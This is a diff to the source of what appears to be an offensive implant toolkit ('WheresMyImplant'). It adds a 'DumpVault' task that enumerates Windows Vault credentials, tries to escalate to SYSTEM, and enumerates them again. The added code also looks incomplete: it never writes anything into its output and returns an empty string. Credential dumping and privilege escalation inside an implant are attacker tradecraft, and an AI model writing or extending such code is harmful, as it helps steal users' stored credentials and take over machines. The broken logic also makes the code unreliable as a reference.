@@ -448,6 +448,23 @@ namespace WheresMyImplant
             return output.ToString();
         }
 
+        [ManagementTask]
+        public static String DumpVault()
+        {
+            StringBuilder output = new StringBuilder();
+            Vault vault = new Vault();
+            vault.EnumerateCredentials();
+
+            CheckPrivileges checkSystem = new CheckPrivileges();
+            String results = "";
+            if (checkSystem.GetSystem())
+            {
+                vault = new Vault();
+                vault.EnumerateCredentials();
+            }
+            return output.ToString();
+        }
+
         //FormalChicken
         public static void StartSmbServer(String pipeName)
         {
